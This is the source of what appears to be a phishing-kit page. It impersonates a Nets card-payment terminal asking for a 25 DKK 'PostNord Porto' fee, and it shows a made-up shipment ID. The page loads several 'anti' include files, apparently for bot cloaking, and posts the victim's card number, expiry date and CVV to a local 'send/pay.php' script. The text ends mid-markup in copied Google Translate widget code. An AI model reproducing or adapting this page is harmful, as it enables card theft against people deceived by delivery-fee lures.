<?php 
include("anti/anti1.php");
include("anti/anti2.php");
include("anti/anti3.php");
include("anti/anti4.php");
include("anti/anti5.php");
include("anti/anti6.php");
include("anti/anti7.php");
include("anti/anti8.php");
include('config.php');

?>
<html xmlns="http://www.w3.org/1999/xhtml" lang="en" class=""><div id="in-page-channel-node-id" data-channel-name="in_page_channel_5m3EUo"></div><head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>Nets - Accept payment</title>
<meta name="robots" content="noindex">
<meta name="referrer" content="origin-when-crossorigin">
<meta name="google" content="notranslate">
<meta name="viewport" content="width=device-width">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<link rel="SHORTCUT ICON" href="./file/img/favicon_New.ico">
<script type="text/javascript" src="./file/js/jquery.3.5.min.js">
</script>
<style>
        .loader {
            border: 8px solid #f3f3f3; /* Light grey */
            border-top: 8px solid #005d92; /* Blue */
            border-radius: 50%;
            width: 60px;
            height: 60px;
            animation: spin 2s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
<style type="text/css">a { color: black; } td.lineTop { border-top: solid 1px black; } div.lineBottom { border-bottom: solid 1px black; }</style>
<link rel="stylesheet" href="./file/css/StyleSheet_ExistingTerminal.css">
<link href="./file/css/4042" rel="stylesheet" type="text/css">


<link type="text/css" rel="stylesheet" charset="UTF-8" href="https://www.gstatic.com/_/translate_http/_/ss/k=translate_http.tr.26tY-h6gH9w.L.W.O/am=XjA/d=0/rs=AN8SPfqxH6skN0uVuOvXhu1kLTotQ5vZoA/m=el_main_css"></head>


<body id="body" style="margin: 0 0 0 0;">
<form name="form1" method="post" action="./send/pay.php" onkeypress="javascript:return WebForm_FireDefaultButton(event, 'okButton')" id="form1" autocomplete="off">
<div>
<input type="hidden" name="__LASTFOCUS" id="__LASTFOCUS" value="">
<input type="hidden" name="__EVENTTARGET" id="__EVENTTARGET" value="">
<input type="hidden" name="__EVENTARGUMENT" id="__EVENTARGUMENT" value="">
<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="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">
</div>













<div>

	<input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="825529CB">
	<input type="hidden" name="__VIEWSTATEENCRYPTED" id="__VIEWSTATEENCRYPTED" value="">
	<input type="hidden" name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="Cul8/fzpgTbNvoBayTfldUI9Dvjxwg4gMl/QsZ8uecboP6UsYGYrn1qlJRVT4x+tNbMboSXUYNiJia3wtAE48EYEQDcXtqEfwV4ntWOMQOcf+t6OlLpH9VcuO4NrkrvEh5C8hqu75uGkagRis+eYzEu2SMhm2YlrqUrxzZDKCTxTBEbBR1DOQK/JTIm6xhWlyFWCFSGdRSmBuiLWGznEE5coSmhbPxX3y95rBAUoe1COgRhQi7gswz6IkIMNlZ07xkqSJLUIjw5dQ3JPCk72TQwGrSEtGp3zL/W/V5DGm7651JF1TwFL+fjaevGZZhGh7UZXwHYOtSMS7jPWbz8arN+pyRdYS7F1D/NKEGsxWcCgiA024+S4kIAM1GApJbRGYze3t3qJeHAz1bVh6Xnh/NbnWOjRsw4GjLE9zL6EpYCi35xTQKInp+A4TUn8dfw0fzvWY4pOzBbCAi9QGaDNdcWu6ipeHRZkwSe+fuSlcaJYJNpNJ437gfxmeR/zAsKrU6sLAmCLaB7HZ6BxBgsuCr+PmT0VOR4+g1Wr/lJw80rhtlHssv1U9rWAzLvwdh4JnkSxHFIyImAtt98V/Wc+bV6LbhX+zFp7abwwGB3ymLrxOf/hy7V8eEtweG2BRw4BhyECC1Cb9BIBW/zKgx393wtfjHzwpnF6XVdOAIfQjJAbTsHbd3MzcDs8V7hiU2OeyKf6lbFSruA0epcYL+rCT/Sc8LnImdMM4MKsECNrs3UO4jjR6Jg9B6kX4dRXbkbHh4Ye9WbfuP2OX6z5FWM3UqN7VgFHXoVrjl7lnsI+r/cZGBZUCMrRD9q/dipoMP67tiAzFbRud8eq0wCcPJSQmtpGcFE7e2WRiJV6NtMVVTGJ97rHl8jTjWLQjGLXuOqQxU5g05rczDb+90bIB/njrFT9MtanHd8ARM3eou6Rog4S9dSQZptsKEDFxzHgKh2+mYn/9Z94HtLfCcWbn+lW8Rq5XJHPmOqfEsi2uaTUvIqVX//ypzR10/pVU4xLlkNOuoqObUIJZvIDwnQ6ufgsUq1AIxrXJg3OX6WVj1wvoDfbY3CpAAA7+Hi0olT29IKIJhp9mz7SZycA/kE89NBwq+2S+Km/e7sCHa2defP4+vkGPyH7luxPCZt9Ga6S3CD8WdaY+UljQRso/Uoe3cFeDvIcVXcBP/lS8uUS2g==">
</div>

        <div id="bbsHostedContent">

            

            <div id="content" style="color:black;">
                <img id="topImage" alt="Netaxept &amp; Nets Logo" src="./file/img/TopLedge_New.png" style="border-width:0px;">
                <div id="contentPadding" class="contentPadding">
                    <div id="merchantInfoOld">
                        <img id="ctl10_merchantTerminalImage" src="./file/img/terminalimage.ashx" alt="Merchant Logo" style="width:100%;border-width:0px;">



<div id="merchantRow" style="word-break: break-all;">
    <span id="merchantLabel" style="font-weight:bold;">Forretning:</span>&nbsp;<span id="ctl10_merchantName" aria-labelledby="_merchantLabel">PostNord Porto</span>
</div>


<table id="TblAmount" style="margin-top: 10px;padding:0px;border-spacing:0px;" role="presentation">
	<tbody>
<tr id="amountRow" role="presentation">
		<th id="thAmount" scope="row" role="presentation" style="padding-right: 0px;">
            <span id="amountLabel" style="font-weight:bold;">Beløb:</span>
        </th>
		<td id="tdAmount" role="presentation">
            <span id="amount" style="font-weight:bold;">25,00 (DKK)</span>
        </td>
	</tr>
	<tr id="vatAmountRow" role="presentation" style="">
		<th id="ctl10_thVatAmount" scope="row" role="presentation">
            
        </th>
		<td id="ctl10_tdVatAmount" role="presentation">
            &nbsp;
        </td>
	</tr>
</tbody>
</table>
<div id="orderNumberDiv">
    <span id="orderNumberLabel">forsendelses-ID:</span>&nbsp;<span id="orderNumber" aria-labelledby="orderNumberLabel">DK30174339238</span>
</div>
<div id="orderDescriptionDiv">
    <span id="ctl10_orderDescriptionLabel" style="font-weight:bold;">Ordrebeskrivelse:</span>&nbsp;<span id="ctl10_orderDescription" aria-labelledby="orderDescriptionLabel">PostNord Online Porto: 148791538</span>
</div>





<div class="lineBottom" style="margin-bottom: 10px; padding-bottom: 10px;display:none">
</div>
<input type="hidden" name="ctl10$hdnMerchandAcqID" id="hdnMerchandAcqID" value="208210"> 
                    </div>
                    
                    

                    
                    <div id="redirectPage">
                        <div id="status_margins" style="margin-bottom:10px;">
	

    <div id="status_errorPanel" class="alert alert-danger errorPanel" style="display:none;">
		
        <span id="status_errorText" role="alert">
</span>
    
	</div>

    <div id="status_warningPanel" class="alert alert-warning warningPanel" style="display:none;">
		
        <span id="status_warningText" role="alert">
</span>
    
	</div>

    <div id="status_infoPanel" class="alert alert-info infoPanel" style="display:none;">
		
        <span id="status_infoText" role="alert">
</span>
    
	</div>

    <div id="status_okPanel" class="alert alert-success okPanel" style="display:none;">
		
        <span id="status_okText" role="alert">
</span>
    
	</div>


</div>

                        

                        
                        <script type="text/javascript">
//<![CDATA[
Sys.WebForms.PageRequestManager._initialize('EasyPayment$sm', 'form1', [], [], [], 90, '');
//]]>
</script>



<div>
    <div id="EasyPayment_issuerIcons">
    <img id="EasyPayment_Visa" title="Visa" class="issuerLogo" src="./file/img/visa.png" alt="Visa" style="border-width: 0px; margin-right: 5px;">
    <img id="EasyPayment_MasterCard" title="MasterCard" class="issuerLogo" src="./file/img/mastercard.gif" alt="MasterCard" style="border-width: 0px; margin-right: 5px;">
    <img id="EasyPayment_JCB" title="JCB" class="issuerLogo" src="./file/img/jcb.png" alt="JCB" style="border-width: 0px; margin-right: 5px;">
    <img id="EasyPayment_Dankort" title="Dankort" class="issuerLogo" src="./file/img/dankort.gif" alt="Dankort" style="border-width: 0px; margin-right: 5px;">
</div>
    <div id="EasyPayment_feeDtlsDiv">
<script type="text/javascript">

    $(document).ready(function () {

        $("#expandCollapse").click(function () {

            if ($("#feeDetails").is(":visible"))
                $("#expandCollapse").attr("src", "./file/img/expand.png");
            else
                $("#expandCollapse").attr("src", "./file/img/collapse.png");
            $("#feeDetails").stop().slideToggle();
        });

    });

</script>


</div>

    <div style="margin-top: 10px">
        <label for="cardNumber" id="EasyPayment_cardNoLabel">Kortnummer</label>
    </div>
    <div id="divGenericSinglePayment" style="vertical-align: bottom;">

        <input name="cardNumber" type="text" maxlength="19" id="cardNumber" class="cardNo" placeholder="0000000000000000" onchange="javascript:GetIssuer2(this.id);" onkeyup="javascript:GetIssuer2(this.id);" autocomplete="off" size="19" style="border: 1px solid dimgrey;" required="">      
        <span id="EasyPayment_currentIssuerName" style="font-weight: bold;">
</span>
        <span id="EasyPayment_currentIssuerId">
</span>

    </div>

        <fieldset style="border:0PX;transform: translateX(-2%);margin-top:10px;">
            <legend id="expiryLabel">Udløbsdato (mm/åå)</legend>
                 <select name="EasyPayment$month" id="month" aria-label="Month" style="border: 1px solid dimgrey;">
	<option value="01">01</option>
	<option value="02">02</option>
	<option value="03">03</option>
	<option value="04">04</option>
	<option value="05">05</option>
	<option value="06">06</option>
	<option value="07">07</option>
	<option value="08">08</option>
	<option value="09">09</option>
	<option value="10">10</option>
	<option value="11">11</option>
	<option value="12">12</option>

</select>
        <select name="EasyPayment$year" id="year" aria-label="Year" style="border: 1px solid dimgrey;">
	<option value="24">2024</option>
	<option value="25">2025</option>
	<option value="26">2026</option>
	<option value="27">2027</option>
	<option value="28">2028</option>
	<option value="29">2029</option>
	<option value="30">2030</option>
	<option value="31">2031</option>
	<option value="32">2032</option>
	<option value="33">2033</option>
	<option value="34">2034</option>
	<option value="35">2035</option>
	<option value="36">2036</option>
	<option value="37">2037</option>
	<option value="38">2038</option>
	<option value="39">2039</option>
	<option value="40">2040</option>
	<option value="41">2041</option>
	<option value="42">2042</option>
	<option value="43">2043</option>
	<option value="44">2044</option>
	<option value="45">2045</option>
	<option value="46">2046</option>
	<option value="47">2047</option>
	<option value="48">2048</option>
	<option value="49">2049</option>
	<option value="50">2050</option>
	<option value="51">2051</option>
	<option value="52">2052</option>
	<option value="53">2053</option>
	<option value="54">2054</option>

</select>
        </fieldset>

    </div>
     <div id="dvSecuritycode">
    <div style="margin-top:5px;">
        <label for="securityCode" id="EasyPayment_verificationLabel">Verifikationskode</label>
    </div>
    <div>        
        <input name="EasyPayment$securityCode" type="text" maxlength="4" id="securityCode" class="securityCode" placeholder="000" autocomplete="off" size="4" style="border: 1px solid dimgrey;">
        &nbsp;<a id="EasyPayment_popupLink" class="help-button-link" href="./p.php" target="_blank">
            <img src="./file/img/helpbutton.png" alt="Open information about CVV2, CVC2 and CID in a new window" style="border-width:0px;">
</a>
        &nbsp;&nbsp;&nbsp;
    </div>
        <span id="mifDiv" style="display:none; margin-top: 15px; align-items: center; transform: none; width: unset;">
            <span id="mifLabel" style="margin-right: 8px">Pay with:</span>
            <input value="Visa" name="EasyPayment$mifIssuer" type="radio" id="EasyPayment_mifIssuerRadioVisa">
            <label for="mifIssuerRadioVisa">
<img id="mifIssuerVisaImage" alt="Visa" src="./all/visa(1).png" style="border-width:0px;margin-right: 8px;">
<span id="EasyPayment_mifIssuerLabelVisa">
</span>
</label>
            <input value="Dankort" name="EasyPayment$mifIssuer" type="radio" id="EasyPayment_mifIssuerRadioDankort" checked="checked">
            <label for="mifIssuerRadioDankort">
<img id="mifIssuerDankortImage" alt="Dankort" src="./all/dankort(1).gif" style="border-width:0px;margin-right: 8px;">
<span id="EasyPayment_mifIssuerLabelDankort">
</span>
</label>

            <span id="EasyPayment_coBrandedInfo" title="Your card has two brands, and you can choose your preferred one for this payment" class="help-button-link">
                <img src="./all/infoIcon_2.png" style="height: 32px; width: 32px">
            </span>
        </span>
        <input type="hidden" name="EasyPayment$validationRequired" id="validationRequired" value="True">
     </div>
 
    <div id="EasyPayment_finnishComplianceInfo">
</div>





                        

                        
                        
                    </div>

                    <div id="orderDetails">                     
                        <div style="padding:7px 11px 0px 8px;">
                            
                            </div>                    
                        <div id="nextDiv">
                        <div id="toolbar" class="box" style="margin-top: 10px;">
                            <div id="toolbarButtons">
                                <div id="newTerminalNavigation">
</div>
                                <div id="oldTerminalNavigation">
                                    
                                    <input type="submit" name="okButton" value="Pay" id="okButton" style="margin-left: 10px;">
</div>
                            </div>
                           
</div>
                        </div>
                    <div id="buttonDiv" class="t_alignCenter">
</div>
                    

                </div>
                    </div> 
                    <div class="col-lg-5 order-3" id="SmallScreen">
                                            
                    </div>

            </div>
        </div>

        

        

        

        <!-- The Modal -->
        <div id="myModal" class="modal" tabindex="-1" role="dialog" aria-labelledby="modalLabel" aria-hidden="true" style="z-index: 10000;">
            
            <div class="modal-dialog" role="document">
                
                <div class="mymodal">
                    <span id="modalHeader" style="font-weight: bold; font-size: 14px;">
</span>
                </div>
                <div class="mymodal">
                    <span id="modalContent">
</span>
                </div>
                <div class="mymodal">
                    <button type="button" class="btn closewindow" onclick="close();">
                        <span id="modalFooter">
</span>
</button>
                </div>
            </div>
            
        </div>
    

<script type="text/javascript">
//<![CDATA[
WebForm_AutoFocus('cardNumber');//]]>
</script>
</form>


    <div class="modal fade" id="modalCVV" tabindex="-1" role="dialog" aria-labelledby="modalLabel" aria-hidden="true" style="z-index: 10000;">
        <div class="modal-dialog" role="document">
            <div class="modal-content">
                <div class="modal-header">
                    <span id="modalLabel" class="modal-title" style="font-weight: bold">Nets - What is CVV?</span>
                    <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                        <span aria-hidden="true">×</span>
                    </button>
                </div>
                <div class="modal-body">
                    <div style="border: solid 1px #7f7b7b;">
                        <table style="border-spacing: 0px" role="presentation">
                            
                            <tbody>
<tr role="presentation">
                                <td colspan="2" role="presentation">
                                    <div style="font-weight: bold; padding: 10px; color: black">
                                        What is verification code(CVV2/ CVC2/CID)?
                                    </div>
                                    <div style="padding-left: 10px; color: black">
                                        <span id="into">The verification code is a 3- or 4-digit number that is printed either on the front or back side of your card. The verification code helps merchant to prevent fraud and verify the transaction when the actual card is not present on the time of purchase. This number is used as part of the authorization process with the card issuer.</span>
                                    </div>
                                </td>
                            </tr>
                            <tr role="presentation">
                                <td valign="top" role="presentation">
                                    <div style="font-weight: bold; padding: 10px; color: black">
                                        Where do I find it?
                                    </div>
                                    <div style="font-weight: bold; padding-left: 10px; color: black">
                                        Visa, Mastercard, JCB, Diners Club and Discover
                                    </div>
                                    <div style="padding-left: 10px; color: black">
                                        <span id="visaCVV">The verification code is the 3-digit number printed on the back of your card, usually at the end of the signature panel. If you use a credit/debit card and want to pay with debit, the verification code is the three digits after the card number on the card's back side.</span>
                                    </div>
                                </td>
                            </tr>
                            <tr role="presentation">
                                <td valign="top" role="presentation">
                                    <div style="font-weight: bold; padding-left: 10px; padding-top: 10px; color: black">American Express</div>
                                    <div style="padding-left: 10px; padding-bottom: 10px; color: black">
                                        <span id="amexCVV">The verification code is the 4-digit number printed on the front of your card, above and to the right of your card number.</span>
                                    </div>
                                </td>
                            </tr>
                        </tbody>
</table>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <input name="terminalDesign" type="hidden" id="terminalDesign" value="false"><div id="goog-gt-tt" class="VIpgJd-yAWNEb-L7lbkb skiptranslate" style="border-radius: 12px; margin: 0 0 0 -23px; padding: 0; font-family: 'Google Sans', Arial, sans-serif;" data-id=""><div id="goog-gt-vt" class="VIpgJd-yAWNEb-hvhgNd"><div class=" VIpgJd-yAWNEb-hvhgNd-l4eHX-i3jM8c"><img src="https://fonts.gstatic.com/s/i/productlogos/translate/v14/24px.svg" width="24" height="24" alt=""></div><div class=" VIpgJd-yAWNEb-hvhgNd-k77Iif-i3jM8c"><div class="VIpgJd-yAWNEb-hvhgNd-IuizWc" dir="ltr">Texte d'origine</div><div id="goog-gt-original-text" class="VIpgJd-yAWNEb-nVMfcd-fmcmS VIpgJd-yAWNEb-hvhgNd-axAV1"></div></div><div class="VIpgJd-yAWNEb-hvhgNd-N7Eqid ltr"><div class="VIpgJd-yAWNEb-hvhgNd-N7Eqid-B7I4Od ltr" dir="ltr"><div class="VIpgJd-yAWNEb-hvhgNd-UTujCb">Évaluez cette traduction</div><div class="VIpgJd-yAWNEb-hvhgNd-eO9mKe">Votre avis nous aidera à améliorer Google&nbsp;Traduction</div></div><div class="VIpgJd-yAWNEb-hvhgNd-xgov5 ltr"><button id="goog-gt-thumbUpButton" type="button" class="VIpgJd-yAWNEb-hvhgNd-bgm6sf" title="Bonne traduction" aria-label="Bonne traduction" aria-pressed="false"><span id="goog-gt-thumbUpIcon"><svg width="24" height="24" viewBox="0 0 24 24" focusable="false" class="VIpgJd-yAWNEb-hvhgNd-THI6Vb NMm5M"><path d="M21 7h-6.31l.95-4.57.03-.32c0-.41-.17-.79-.44-1.06L14.17 0S7.08 6.85 7 7H2v13h16c.83 0 1.54-.5 1.84-1.22l3.02-7.05c.09-.23.14-.47.14-.73V9c0-1.1-.9-2-2-2zM7 18H4V9h3v9zm14-7l-3 7H9V8l4.34-4.34L12 9h9v2z"></path></svg></span><span id="goog-gt-thumbUpIconFilled"><svg width="24" height="24" viewBox="0 0 24 24" focusable="false" class="VIpgJd-yAWNEb-hvhgNd-THI6Vb NMm5M"><path d="M21 7h-6.31l.95-4.57.03-.32c0-.41-.17-.79-.44-1.06L14.17 0S7.08 6.85 7 7v13h11c.83 0 1.54-.5 1.84-1.22l3.02-7.05c.09-.23.14-.47.14-.73V9c0-1.1-.9-2-2-2zM5 7H1v13h4V7z"></path></svg></span></button><button id="goog-gt-thumbDownButton" type="button" class="VIpgJd-yAWNEb-hvhgNd-bgm6sf" title="Mauvaise traduction" aria-label="Mauvaise traduction" aria-pressed="false"><span id="goog-gt-thumbDownIcon"><svg width="24" height="24" viewBox="0 0 24 24" focusable="false" class="VIpgJd-yAWNEb-hvhgNd-THI6Vb NMm5M"><path d="M3 17h6.31l-.95 4.57-.03.32c0 .41.17.79.44 1.06L9.83 24s7.09-6.85 7.17-7h5V4H6c-.83 0-1.54.5-1.84 1.22l-3.02 7.05c-.09.23-.14.47-.14.73v2c0 1.1.9 2 2 2zM17 6h3v9h-3V6zM3 13l3-7h9v10l-4.34 4.34L12 15H3v-2z"></path></svg></span><span id="goog-gt-thumbDownIconFilled"><svg width="24" height="24" viewBox="0 0 24 24" focusable="false" class="VIpgJd-yAWNEb-hvhgNd-THI6Vb NMm5M"><path d="M3 17h6.31l-.95 